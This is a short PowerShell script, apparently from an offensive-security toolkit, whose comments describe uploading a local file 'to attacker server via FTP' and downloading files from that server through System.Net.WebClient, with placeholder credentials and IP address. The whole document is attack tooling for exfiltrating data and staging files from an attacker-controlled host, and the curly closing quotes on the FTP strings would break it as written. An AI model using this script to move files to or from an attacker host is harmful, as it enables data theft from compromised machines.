#! /usr/bin/pwsh
#PowerShell script for upload and downloading files via FTP

#Upload a file to attacker server via FTP
$File = "file.txt" #file path
$ftp = "ftp://username:password@IP_address/filename”
$webclient = New-Object System.Net.WebClient #initialize a webclient
$uri = New-Object System.Uri($ftp) #connect to the client
$webclient.UploadFile($uri, $File) #using the url upload

#Download a file from attacker server via FTP
$File = "file.txt" #file path
$ftp = "ftp://username:password@IP_address/filename”
$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftp)
$webclient.DownloadFile($uri, $File)

#To call this script, on command line  .\ftp_transfer.ps1
